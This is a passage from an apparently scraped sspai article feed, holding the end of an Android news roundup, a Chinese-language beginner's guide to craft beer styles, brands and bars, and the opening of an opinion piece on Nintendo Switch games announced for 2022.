ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/e9761f252f067b2e3100b79645f0494e\"></figure><ul><li>与 Galaxy S22 一道正式亮相的三星 Expert RAW App，其实在此之前已经在 S21 Ultra 上测试了一段时间，从目前三星论坛的一位社区管理员的消息来看，这一相对进阶的拍照 App 未来也会面向更多现有 Galaxy 系列手机发布，Expert RAW 的首个稳定版将于 2 月 25 日发布，预计届时也会面向更多设备一并推出。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/4f67d594772923aa53e18920b3c35ced\"></figure><h2>💡 彩蛋：Google 智能台灯</h2>\n<p>本周供职于 Google 的设计师 <a href=\"https://twitter.com/bengold\" target=\"_blank\">Ben Gold</a> 发布了一组关于「Google 台灯」 的照片：这不是什么未发布新品的曝光，而是一款 Google 专供内部员工销售的产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/3540461a433c2f357eb2e84dfae73756\"></figure><p>这款台灯的正式名称为 dLight（读音上更像是 \"Delight\"），而且这款灯在设计上就有考虑到在居家办公场景，并且有不同色温/亮度等选项可供调节。通过 USB-C 线材供电，并且支持 OTA 更新固件</p>\n<p>虽然这款产品并不外售，但从之前 FCC 认证信息以及台灯底座的照片信息来看，这款台灯似乎仍然是支持在 Google Home 生态联动，实现更多智能操作功能，但目前这款颇具风格的灯具似乎还尚未开售，可以多个角度旋转的支架设计似乎很适合远程会议时充当补光灯呢。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/1887563432ae91e2f8210e76b726dbed\"></figure><hr>\n<p><strong>关于 Refresh 周报</strong>：每周更新泛 Android 领域内容，带你回顾过去一周 Android 数码/行业领域值得关注的大小事。</p>\n<h2>🚏 投稿/联系我们</h2>\n<p>如果你有撰写与 Update 专栏 / Refresh 周报风格类似的文章，相信读者会喜欢；或是有开发自己的 Android 应用想要让更多人关注到，我们都非常欢迎👏。</p>\n<p>Email：editorinchief@safaricheung.pro</p>\n<p>Twitter：<a href=\"https://twitter.com/update4weekly\" target=\"_blank\">@update4weekly</a></p>\n<p>Telegram 频道：<a href=\"https://t.me/update4weekly\" target=\"_blank\">@update4weekly</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/61ac6c8b4cf1cedf33a97d25a7fc79a1\"></figure><p><strong>鸣谢</strong>：<a href=\"https://t.me/NewlearnerChannel\" target=\"_blank\">Newlearnerの自留地</a></p>\n<p>本文非商业目的转载授权遵循 <a href=\"https://creativecommons.org/licenses/by-nc/4.0/\" target=\"_blank\">CC BY-NC 4.0</a> 协议</p>\n<p>版权所有 ©️Android Weekly Update 2020-2021</p>\n<p>Design by @studiomockup/小樣設計</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71480"},{"title":"啤酒里也能喝出花果香？精酿啤酒入坑指南","date":"2022-02-16 08:26:47","description":"\n<p>名字起得很俗，动笔之前预想过很多开头，写的时候喝点酒文字就自然流淌了，甚至为了这篇文章，特意全家找了些基础啤酒😄为了补充一下啤酒相关的基础知识，刷了今年中金公司三篇啤酒相关的研究报告，以及最近精酿吵架的几篇文章。</p>\n<p>文章会从基础概念开始，然后延伸到精酿啤酒品饮的一些基础常识，如果后期有其他反馈我们会根据具体问题展开其它主题的文章分享。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/article/a5a96a237b7fa33b569c664fc8f97182\"><figcaption>全家便利店常见酒款</figcaption></figure><h2>如何定义啤酒，这是一个问题</h2>\n<p>在开始聊精酿啤酒之前，我们先来谈谈概念。</p>\n<p>「什么是啤酒」是一个看似不是问题的问题，但如果不通过准确的文字给出明确表述内涵和外延的定义，在聊到某些具体的品类时仍会产生歧异。关于啤酒的定义，人们也从不同角度给出了不同的解释：</p>\n<p>第一种定义，一般印象里，啤酒是由谷物为主要原料，添加酒花发酵而成的低度酒精饮料，喝起来带有二氧化碳起泡带来的沙口感。当然，实际上大量啤酒分类不能被上述表述概括。此外，大众印象里的啤酒主要指来自常见的啤酒大厂，例如燕京、青岛和雪花等，生产的工业淡拉格（一种啤酒风格分类）啤酒。</p>\n<p>第二种定义，也是最广泛的定义——谷物发酵产生的含酒精液体。按这个定义，早期中国没有出现蒸馏技术之前的含酒精饮料都能筐进去，现在很多材料对于早期啤酒的追溯（一本正经脸）确实是这么干的，比如随手搜点材料，不用较真：</p>\n<ul>\n<li>9000 年的啤酒历史：<a href=\"https://new.qq.com/omn/20210902/20210902A0DHC300.html\" target=\"_blank\">啤酒本是舶来品，但新发现证明，9000 年前中国就会酿啤酒了！</a>\n</li>\n<li>雪花号称古法酿造的啤酒：<a href=\"https://www.163.com/dy/article/GASMEVTA05395FOK.html\" target=\"_blank\">华润雪花「醴」获新生，致敬中国千年酿酒文化</a>\n</li>\n<li>不正经啤酒史：<a href=\"https://movie.douban.com/subject/5976661/\" target=\"_blank\">啤酒是如何拯救世界的 </a>\n</li>\n</ul>\n<p>第三种定义，近些年的一个不是标准定义的定义，是很多德国啤酒厂商常常引用的《<a href=\"https://www.jiuhuar.com/news/606c56bf8ba5b09d638b4596.html\" target=\"_blank\">德国啤酒纯净法</a>》。技术细节在文章里讲得蛮清楚的，定义性的内容就不展开补充了。</p>\n<p>早期的工业啤酒基本上都严重的同质化，啤酒工业的主要优势是成本优势，地方啤酒厂也以运输半径带来的成本优势在国内遍地开花。差异化竞争中，德国啤酒的概念被有意或无意的建构起来，在一般消费者眼中，德式啤酒意味着更加厚重的酒体、更加突出的麦芽香味、更加浑浊的酒液等，最终品质要好过普通工业啤酒。</p>\n<p>不过，「德国啤酒」本身并不是一个明确的概念，如果按现在的啤酒风格分类，更多的是指德式小麦啤酒，这样的定义显然是不适合用来定义啤酒的。</p>\n<p>另外还有几个典型反例，与第一种定义相矛盾。BJCP（Beer Judge Certification Program）收录了西打和蜂蜜酒两个风格分类，这与第一种定义中的「以谷物为原料」相矛盾。部分类型的啤酒没有明显的沙口感，也有啤酒添加了氮气替代了二氧化碳给泡沫，带来了更加细腻的口感，这些都与第一种定义的口感相矛盾。部分啤酒通过冰馏技术实现了一般蒸馏烈酒的高酒精度，这与第一种定义中酒精度定义相矛盾。</p>\n<p>我个人还是愿意以第一种定义为啤酒的一般定义，再包括一些普通啤酒中不常见的特殊酒款，即：「一般为谷物为原料添加啤酒花发酵而成的低度含酒精饮料，可以通过特殊技术提升酒精度，也可以通过其它原料进行增味；在部分分类习惯中，包括水果发酵和蜂蜜发酵酒。」</p>\n<h2>有了定义，我们再来谈谈啤酒和精酿啤酒</h2>\n<h3>工业啤酒——大众眼中的啤酒</h3>\n<p>大众对于啤酒的主要印象来自于常见的工业啤酒，工业啤酒是指通过工业化大设备生产的啤酒，由于技术、历史渊源以及市场偏好的原因，慢慢形成了现在常见的这种常见的百威、雪花的样子，在啤酒的工艺和风格分类中属于淡色拉格。</p>\n<p>淡色拉格的下发酵工艺适合现在大型工业生产，其淡爽的味道适合大多数人吨吨吨。</p>\n<p>正因为工业啤酒的生产技术相似、归属风格相同，所以口味实际差别不大。反过来，大规模的生产方式也决定了工业啤酒在口味上无法追求更极致的风味或特色。</p>\n<p>关于工业啤酒的味道表现，有两个拓展点：</p>\n<ul>\n<li>一是许多工业啤酒会出现馊臭的味道，这个的原因可以参考这个视频：<a href=\"https://www.bilibili.com/video/BV1bV411o7cU?spm_id_from=333.999.0.0\" target=\"_blank\">我的啤酒裡有「臭鼬」的味道？</a>\n</li>\n<li>二是认为工业啤酒除了使用麦芽外还会添加大米，所以导致啤酒的麦芽香气不足。在啤酒风格分类中，麦芽香气不属于淡色拉格应该必须表现出来的味道，降低麦芽使用也不完全是大米成本低于麦芽，有兴趣可以自行搜索一下具体原因。</li>\n</ul>\n<p>有了关于工业啤酒的概述，下文关于精酿啤酒的讨论才好展开。关于精酿啤酒的一个不太正经的定义就是：不是工业啤酒的啤酒就算精酿啤酒。</p>\n<h3>黑黄白——介于工业和精酿之间</h3>\n<p>说到与常见的工业啤酒不一样的好啤酒，多数消费者的第一印象是德国啤酒，第二印象是那些含餐带酒的餐吧中所谓的自酿啤酒。这些啤酒可以简称为「黑黄白」，即黑啤、黄啤和白啤，这种分类主要是按照颜色区分，但也属于不严格的定义方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/38ecb0ca82d8c1fe863816a56ab45248.jpg\"><figcaption>不同颜色的啤酒</figcaption></figure><ul>\n<li>黑啤一般指深色啤酒，通常带有偏棕色或更深的颜色，带有焦香口感，酒精度可能稍高的酒款，但不一定能够对应上啤酒分类中的典型深色啤酒酒款。常见的深色酒世涛较多，酒体厚重，会给舌头带来明显的沉重感，而黑啤对于普通世涛甚至波特来说，酒体都会显得更加单薄，不负责任的猜测很多时候可能仅是使用了深色麦芽的普通拉格啤酒。</li>\n<li>黄啤一般属于颜色介于黑啤和白啤中间的酒款，一般带有未过滤比普通工业啤酒更厚重一点的酒体，带有明显的麦芽味道。一般黄啤卖家对这东西也没有一个准确定义，很常见的情况是把未过滤的普通淡色拉格认为是黄啤。</li>\n<li>白啤一般颜色可能更淡一点，也可能与黄啤在颜色上没有明显的区别，很多时候这个定义更加模糊。与常见的福佳白啤、燕京白啤不同，前两者属于明显的比利时小麦风格分类，带有典型的桔皮香气和芫荽籽香气，普通的饭店中碰到的白啤显然大概率是不属于这个风格的。</li>\n</ul>\n<p>这类啤酒通常会出现在一些餐吧中，常常还伴随着啤酒发酵罐，让顾客看起来好像很厉害的样子。这类的啤酒当然不算工业啤酒，但大概率也不算精酿啤酒。如果不是业内知名的酿酒师或者品牌做的，不建议喝这种啤酒，酿造工艺问题出现高级醇导致头疼的可能性非常高。</p>\n<h3>精酿啤酒——全新的啤酒饮用潮流</h3>\n<p>广义上的精酿啤酒，不包括基础的工业拉格，但包括进阶版的精酿拉格啤酒，在 BJCP 材料里也包括西打（cider）和蜂蜜酒（mead）。其中，西打定义上是苹果发酵酒，实际操作中，果类发酵酒也有标注西打的用法；蜂蜜酒喝起来有点类似葡萄酒中的冰酒的甜腻口感。</p>\n<p>严格定义的精酿啤酒目前还没有特别统一，比较严格的相关表述主要借鉴美国啤酒酿造商协会（Brewers Association，简称 BA），针对的是啤酒厂而不是啤酒本身。对应的英文「craft beer」在我国 2019 年出台的《工坊啤酒及其生产规范》给出的定义表述为：工坊啤酒，由小型啤酒生产线生产，且在酿造过程中不添加与调整啤酒风味无关的物质，风味特点突出的啤酒。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/0c3435cdaa14fd1ff2631b2aeb0d5a53.jpg\"></figure><p>刚入坑的啤酒爱好者常常会看到很多关于「什么是精酿啤酒」的界定，比如「『黑黄白』不算精酿」、「加大米不算精酿」、「标原浆的不算精酿」、「麦汁浓度低的不算精酿」、「某些标着精酿字样的品牌不算精酿」等。上述的观点大概率来说不算错，但也不用特别在意这些定义。喝多之后你就会对「什么是精酿」有着更为切身的了解，并形成自己的判断标准。</p>\n<h2>入坑精酿啤酒，从这些入门款开始</h2>\n<p>就国内的精酿啤酒传播历史来看，大部分爱好者接触到精酿啤酒的路径都非常相似——早期接触比利时小麦和比利时修道院类啤酒，中后期由于进口品类的极大丰富广泛接触了其它风格分类。</p>\n<p>因此，我列举了常见的大型超市中简单可获得的酒款，它们通常不难买到，而且只要喝过一遍就能大致树立对精酿啤酒的感知，都很值得推荐给入门的酒友：</p>\n<ul>\n<li>福佳、1664、燕京白啤——风格分类比较相似的比利时小麦啤酒，很多人可能无意间接触精酿都是从这几款开始的，带有明显有别于传统的工业啤酒的风味。</li>\n<li>粉象、罗斯福、马里斯、智美、卡梅里特等——常见的比利时修道院啤酒，属于一般酒友接触高度啤酒最初接触的一类，酒精度数可以高达 10 度左右。罗斯福 10 号一度成为评价酒友酒量的小标准。</li>\n<li>高大师的婴儿肥、鹅岛 IPA、拳击猫、酿酒狗的朋克 IPA、Stone 的 IPA——这类 IPA 是大型超市或者全家和 711 这种连锁可能找的到的 IPA 类啤酒。IPA 啤酒的特点是比一般啤酒更高的苦度，通常带有明显的酒花香气。</li>\n<li>健力士世涛啤酒——世涛啤酒是一个啤酒类型，而健力士的世涛则是大部分人会最先接触到的世涛啤酒，其泡沫的麦浪翻滚非常漂亮。不过，按典型的厚重世涛感来说，健力士不是常见的世涛风格。</li>\n<li>乌奎尔皮尔森、青岛皮尔森——味道与工业啤酒很相似，但是更加明显的苦度和香气，能让不知道的人第一口明显感到精酿区别于工业啤酒的口感。</li>\n<li>再推荐就只能看看运气了：小清新的帝都海盐古斯啤酒，在很多餐吧和超市都能碰到，口味清新咸爽可口，非常适合夏天；女公爵，法兰德斯红风格，略酸，很多小姑娘喜欢。</li>\n</ul>\n<p>如果你对上述品牌不了解也没关系，淘宝等电商平台有商家在卖类似「基础精酿套装」的产品，其中通常包含了上述啤酒中的一部分（甚至全部）。新酒友可以购买一两个套装喝喝看，很快就能辨别不同品牌和类型精酿的特性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/article/acd407488bb086365cb70ab00b8dd85b\"><figcaption>淘宝「启德酒水」店铺的精酿组合示例</figcaption></figure><h2>当我们说起精酿啤酒时，我们在聊什么？</h2>\n<p>随着喝酒时间长了，对于啤酒了解越来越多，不少酒友开始学习酿酒、学习系统的品饮方式、学习啤酒行业相关的各类知识等。不可避免地，酒友之间的聊天会包含专业术语、行业定义、口语解释以及非专业误解，我在下文中汇总了一些常见的酒友间会聊起的话题：</p>\n<h3>如何描述啤酒</h3>\n<p>面对新酒友，我更愿意这样向对方介绍啤酒：「不同类型的啤酒带有不同的口感——常见的红酒口感，干红、干白、冰酒和气泡感很足的香槟啤酒里都有类似的风格；喜欢喝茶叶，IPA 类有典型的苦味和植物香；常见的水果，樱桃、百香果、凤梨、西柚等水果味道在啤酒里都能找到；深色啤酒会有可可、咖啡、曲奇、花生、椰子的味道；还有带有些威士忌类泥煤烟熏口感；花椒增味会有新鲜花椒的清爽；辣椒味道会有类似香草的口感；肉桂会有甜甜苹果派的口感。」</p>\n<p>事实上，对于每一位新酒友，都可以根据自己的味觉体验对啤酒做个简单的分类，例如：</p>\n<ul>\n<li>是不是喜欢甜，甜型有西打类，蜂蜜类，一些帝国世涛类描述上带有奶油等字样的，最近比较火的果泥类</li>\n<li>是不是咸，古斯类</li>\n<li>是不是苦，苦味常出现在 IPA 类精酿中，还有些苦啤风格，与传统的刻板印象不同，世涛类黑色啤酒苦味并不突出，尤其是部分高度世涛由于工艺风格问题会有明显的甜感</li>\n<li>是不是酸</li>\n<li>是不是酒体厚重</li>\n<li>是不是有其他喜欢的增味，烟熏泥煤</li>\n</ul>\n<h3>口味的变化</h3>\n<p>精酿啤酒与工业啤酒的重要差异就在于无限的可能性，我很喜欢北京的一家店名字叫做「万未」，店长之一跟我说这意思是万般未来，就很好地描述了「无限可能」的感觉。</p>\n<p>常见的喝酒路径是：从 IPA 开始入门狂喝，一两年后口味越喝越重，主要指标就是苦度值越来越高。当然有些人也不一定沿着这个路径演进，喝一段时间后，常见的结果是酱油党和醋党的路线之争。世涛类厚重的像酱油，而酸类啤酒喝起来像醋，两个风格分类相比其他分类高端款式更多，所以常见老酒友会在两个分类里有一个偏好。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/15/article/65d2fc074767af532485d3fdedf0e1db\"><figcaption>朋友圈盗图</figcaption></figure><h3>酒吧风格差异</h3>\n<p>酒吧和酒吧差异很大，对于本地精酿酒吧比较熟悉的酒友，都会有一个概念，我今天去哪个酒吧预期会是怎么样子的。以上海为例，不同酒吧在我眼中的样子是：</p>\n<ol>\n<li>店铺 A：原来对门有个大肠面不错，后来关了，现在冲着蹭老板的员工餐去的</li>\n<li>店铺 B：TAP 酒头<sup class=\"ss-footnote\" href=\"\" title=\"编者注：Tap 指啤酒桶上那个类似水龙头的装置，用来快速输出啤酒。某家店里的 Tap 越多，通常说明店的规模越大，酒水的消耗量也大。\" footnote-id=\"1\">1</sup>很多，轮换得快，生啤新鲜，比较火的当期酒款很快就会上线</li>\n<li>店铺 C：招牌鸡丝拌面比酒有名</li>\n<li>店铺 D：上海酸啤最厉害的酒吧</li>\n<li>店铺 E：瓶子点，尖货比较多，当期比较热门的进货很快，价格便宜</li>\n<li>店铺 F：网红打卡地，每家店都超级大</li>\n<li>店铺 G：上海精酿品牌，自酿为主</li>\n<li>店铺 H：国产精酿接管活动做的比较多</li>\n<li>店铺 I：某牌子的酒款比较多，偶尔一些客啤，西餐简餐</li>\n<li>店铺 J：外国大厂，西餐简餐，汉堡不错</li>\n<li>店铺 K：外国大厂，网红酒吧，贵</li>\n</ol>\n<p>简言之，有的店餐好，有的生啤多，有的罐子进货快，有的主打自酿，有的环境比较好，所以去之前最好知道自己去哪里，有一个合理预期，或者有明确诉求，然后匹配需求去找酒吧。</p>\n<h3>国产精酿靠谱吗</h3>\n<p>国内的精酿品牌最早在北京开始大量出现。早期北京很多是酒吧含餐带酒，精酿做得也不错。随后，许多国产精酿出名之后开始商业化。目前，国内精酿品牌从北京和上海集聚，发展到后来全国到处开花的局面。</p>\n<p>国产精酿的品质与国外对比各具优势：入门款——能喝，没有瑕疵的基础风格分类的啤酒总是不在关注的焦点上，国内很多厂牌基础风格分类做的都挺不错的。入门到进阶——对标国外一些基础厂牌的核心单品，这个话题就比较容易导致争议。我个人感触，对木舌头大差不差，都还不错。如果非要对比，如果部分跟新鲜度高度相关的品类，国产有新鲜度优势，如果日期很好的话。品控上，国内很多品牌还需要进一步提高，也不是太确定到底是出品还是罐装还是运输的问题，国内品牌的一些核心单品状态经常出现较大波动。</p>\n<p>价格是另一个较大的影响因素，国内目前很多品牌的核心产品定价已经与国外的经典款价格持平，不过整体的价格空间还是相对国外会有一个价格区间差位。对于没有猎奇爱好的酒友，以适饮为主的品饮，选择国产具有典型风格分类同时具有价格优势的品类，也是一个较常见的消费场景。</p>\n<p>国产品牌创新和多样化尝试一直都在努力，包括过桶、酸、金酒和威士忌的酿造尝试，很多国产品牌方都有一些前期探索的成果，未来也很期待这些方面会有更多新的的东西出来。</p>\n<h3>判断酒的瑕疵</h3>\n<p>精酿啤酒也不都是特别好的东西，很多时候由于各种问题，会导致味道里有瑕疵。导致这种结果的原因包括原料问题、酿造问题、染菌问题、储存运输问题、光照问题、日期问题等。很多时候很多人对于这些味道并不敏感，但是新鲜状态好的啤酒一般会更让人愉悦。除可能存在长期储存或者橡木桶陈的世涛和酸类啤酒，这个标准一般都是适用的。</p>\n<p>对于桶陈啤酒，会有典型的桶味，往往没有那么年轻的味道，甚至一些酸类还有些腐味。大的风格分类中不要错误使用瑕疵去批评酒的味道，就不容易那么露怯。</p>\n<h3>参与展会</h3>\n<p>部分城市会举办比较大的啤酒展会，主要包括啤酒设备厂、原材料厂、进口商和国产啤酒品牌方参展，活动期间比较有意思可以看看相关各类展品，而且经常会提供免费试饮。由于可以尝试的酒款太多，以至于大部分人一天根本尝不完几款酒就被放倒了。展会期间，可以跟着酒友凑凑热闹，跟过节一样。</p>\n<h3>BJCP &amp; Cicerone</h3>\n<p>两个证书，第一个是家酿评委证书，考出来可以申请参加家酿大赛的评委。第二个主要是侍酒师相关的认证。</p>\n<ul>\n<li><a href=\"https://dev.bjcp.org/\" target=\"_blank\">Beer Judge Certification Program – Promoting beer literacy, recognizing beer tasting and evaluation skills. (bjcp.org)</a></li>\n<li><a href=\"https://www.cicerone.org/int-en/zhcn\" target=\"_blank\">Cicerone：我们懂啤酒 | Cicerone Certification Program</a></li>\n</ul>\n<h3>处处有大师</h3>\n<p>很多酒友真的很专业，也有不少就是从业者，称呼他们「大师」并不过份，开玩笑的时候尊称叫大师也可以。另一方面，背后说人坏话时候，也有不少人用这个称呼用来吐槽某些酿酒师。😄此处没有任何隐喻和所指，只是客观表述一个常见的现象。</p>\n<h3>误解与包容</h3>\n<p>大部分精酿酒友都挺有意思的，长期饮酒的人或许对酒精类饮料有明显偏好，但是大部分酒友们之间并没有劝酒的风气。精酿爱好者中，有的人或许偶尔放纵喝个大醉，但长期酗酒的并不常见。</p>\n<p>不仅如此，啤酒肚也跟精酿啤酒之间没有必然联系，反倒是爱好健身的酒友占比更高。</p>\n<p>精酿爱好者对水啤并不抵触。盲品工业啤酒是精酿爱好者中常见的娱乐活动，虽然他们能跟你头头是道的讲工业拉格的生产工艺，但是盲品除百威、青岛之类的多款常见啤酒，对于这些精酿爱好者而言也非常不容易。大夏天的时候，偶尔清爽的拉格啤酒配餐透透，没有人会拒绝的。</p>\n<h2>好喝的精酿哪里找？</h2>\n<p>对于精酿啤酒的搜索，可以分为搜酒吧和搜酒两大类。常见搜酒吧的方式有大众点评和酒花儿 app，酒花儿的「附近的酒吧」功能蛮好用的，但数据更新不及时，在某些城市可能大众点评更具时效性。各地市的酒友都会制作和分享自己城市的精酿啤酒地图，也可以搜搜看。如果你是上海的酒友，有「上海啤酒活地图」之称的朋友 Leo 就做了一个，效果如图（<a href=\"https://mp.weixin.qq.com/s/TmnPq05QpKgBzLgtD4fRcA\" target=\"_blank\">点击这里获取</a>）：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/15/article/f6af935d7898729037a9a6678749ccbc\"><figcaption>上海精酿地图</figcaption></figure><p>搜酒则是在遇到了一个酒款，想要确定这个酒款的基础信息或者这个酒风格分类的基础信息的时候进行搜索。国内的话，酒花儿 app 也提供相应资讯，国外的朋友则用 Untappd 居多。此外还有朋友推荐 Ratebeer，但我没怎么用过。</p>\n<p>另外，查询啤酒风格分类和酿造工艺基础信息还可以使用一个微信小程序，叫《酿啤酒》。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/article/0a59ac1919b23f50315a3eb6d08edae4\"><figcaption>酿啤酒微信小程序</figcaption></figure><h2>小结</h2>\n<p>前两天跟朋友闲聊，她说要是她写精酿，就会讲精酿精神，对应讲摇滚和潮牌，中间很多关键人物有非常多的有趣故事，相互促进；再讲得远点，可以聊聊现代和后现代的文化。不过，对于喜欢精酿啤酒要开始入门的朋友，本文中介绍的内容可能对你来说更为实际。</p>\n<p>祝你早日找到自己喜欢的酒，干杯！</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71461"},{"title":"看完 2022 年的任天堂直面，聊聊我对 Switch 平台的期待","date":"2022-02-16 06:30:00","description":"\n<h2>写在前面</h2>\n<p>2 月 10 号早上 6 点爬起来看完整场<a href=\"https://sspai.com/post/71354\" target=\"_blank\">任天堂春季直面会</a>直播，直到现在也按耐不住兴奋的心。出于这份久违的冲动，这篇<strong>极具主观性</strong>的文章就这样落地了。</p>\n<p>本文将从我自 2017 年购入 Nintendo Switch 以来的种种感悟和思考入笔，具体聊一聊我对 2022 年 Switch 平台的期待，希望能为对 Switch 有兴趣但还未购入的读者提供参考。</p>\n<p>本文主观性很强，如果与你的想法相左，欢迎交流讨论。感谢各位的包涵和理解。</p>\n<h2>快让 2021 过去吧</h2>\n<p>刚刚过去的 2021 年对作为玩家的我来说是相当魔幻的一年。或许是因为疫情，或许是由于全球经济环境动荡、供应链问题严重，又或许是其他更为复杂的理由所致，整个 2021 年仿佛就是全世界的游戏厂商约好了时间一起表演「翻车」，一年下来值得回味的新作屈指可数。</p>\n<p>这里我就不点名批评去年我预购的某两款令我失望的游戏了，它们的名字里都有四个数字，第一个是「2」、第二个是「0」——嗯，你懂的。(-_- )</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2022/02/14/a7ef71b71dbb0b08dcc4875d56e8eabf.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/14/f9c7ec01bef9b7898e20699050f62d62.jpeg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/14/8762d7fb3fe387a85c2665de69dab29c.jpg\"></figure><p>对于 2021 年里的任天堂，虽然称不上翻车，但对我来说第一方阵容也同样算是乏善可陈，缺少足够多的亮点。除了《密特罗德：生存恐惧》《超级马力欧 3D 世界》重制新增的《狂怒世界》资料片外，实在没有特别能吸引我的新作了。（《集合啦！动物森友会》的 2.0 大更新及 DLC 也算一个吧，虽然不是新作。）</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2022/02/14/505c8f893bfe2daba0201f6c6edf8523.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/14/d175b047e6c16b4d5c01074be60a570e.jpg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/14/48154832f71fb009900cdc8dc518c151.png\"></figure><p>在熬过了魔幻的 2021 后，我们终于迎来了似乎会有转机的 2022 年。</p>\n<h2>继 2017 后的风云再起？</h2>\n<p>遥想 5 年前，Switch 初出茅庐就带着一整年份的豪华阵容护航：数十家媒体给予满分评价的《塞尔达传说 旷野之息》与《超级马力欧 奥德赛》；至今仍在总销量榜首的《马力欧卡丁车 8 豪华版》；首次突破千万级销量之壁的新 IP《Splatoon 2（斯普拉遁 2）》；在 JRPG 爱好者中久负盛名的《异度神剑 2》；与育碧的 IP 合作《马力欧+疯狂兔子 王国之战》；展示 Switch 分手柄体感独特玩法的《ARMS》；宝可梦 IP 的格斗游戏《宝可梦铁拳 DX》；与光荣特库摩合作的独占无双游戏《火焰纹章 无双》……</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/05a30a9fba13dfe1d264d11bb6de9175.jpg\"><figcaption>神仙打架的 2017 年</figcaption></figure><p>2022 年，任天堂旗下许多红极一时的游戏系列新作都将在年内发售。各位手捧 Switch 的玩家们，我们似乎又有机会再次见证能够比肩、甚至超越 2017 年的「任天堂狂欢」了。</p>\n<p>根据官方公开的信息，任天堂目前定档于 2022 年发售的第一方（及第二方）新作有这些：</p>\n<ul>\n<li>《宝可梦 阿尔宙斯》（1 月 28 日，已发售）</li>\n<li>《星之卡比 探索发现》（3 月 25 日）</li>\n<li>《Nintendo Switch Sports》（4 月 29 日）</li>\n<li>《马力欧激战前锋 战斗联盟（Mario Strikers Batlle League）》（6 月 10 日）</li>\n<li>《火焰纹章 无双 风花雪月》（6 月 24 日）</li>\n<li>《斯普拉遁 3（Splatoon 3）》（2022 年夏季）</li>\n<li>《异度神剑 3》（2022 年 9 月）</li>\n<li>《塞尔达传说》系列新作（2022 年内）</li>\n<li>《猎天使魔女 3》（2022 年内）</li>\n<li>《马力欧+疯狂兔子 星耀之愿》（2022 年内）</li>\n</ul>\n<p>上述作品中，除了一经发售就刷新了宝可梦系列销售速度记录、首周销量突破 650 万份的《宝可梦 阿尔宙斯》，还有诸多极有可能会保持甚至超越系列以往销售水平的作品。</p>\n<p>把它们全都一股脑地塞进一个 2022 年里，任天堂的下一个财年怕是想不赚翻都难。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/14/115fa4116ea9871f6c5066cd9d50f292.jpg\"><figcaption>有没有似曾相识的感觉？（图片来源网络）</figcaption></figure><h2>我相信它们会很好玩</h2>\n<p>你可能会想说：「话没必要说的这么绝对嘛，你又不是任天堂的员工，你怎么会知道这些新作品一定不会像去年某些『20XX』游戏那样『翻车』呢？」</p>\n<p>当然了，我确实没有「铁证」去证明这一点。不过接下来我打算以一名游戏行业从业者——或者说以一名游戏设计师的视角阐释我对下面这几款游戏的喜爱，聊一聊「为什么我总是如此相信任天堂」。</p>\n<h3>塞尔达传说 系列新作</h3>\n<p>自 2017 年《塞尔达传说 旷野之息》问世以来已经过去了近 5 年，这部作品的声誉也依然在玩家之间回荡。仿佛一提起 Switch 就一定会有人想起这部《塞尔达传说》。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/1821ff5e2845179880cf944002236ed6.jpg\"><figcaption>塞尔达传说 旷野之息（2017）</figcaption></figure><p>当任天堂在 2019 年 E3 展的「One More Thing」环节中公布了承接《旷野之息》衣钵的系列新作时，许多老玩家就已经猜测这可能会是一部类似《梅祖拉假面》之于《时之笛》那样的作品。</p>\n<p>具体一点来说，《塞尔达传说 梅祖拉假面》是在《塞尔达传说 时之笛》发售后间隔短短 2 年（对于本系列的开发周期来说足够短）就立即发售的系列续作，两部作品都登陆于当时的任天堂 N64 主机平台。</p>\n<p>《梅祖拉假面》作为续作，它沿用了诸多《时之笛》的内容素材，因此除了整体风格基调变化很大以外，在画面表现上并无本质提升。这种素材复用的方案是《梅祖拉假面》的开发周期能够大幅缩短的一个主要原因。</p>\n<figure class=\"image ss-img-wrapper\"><img 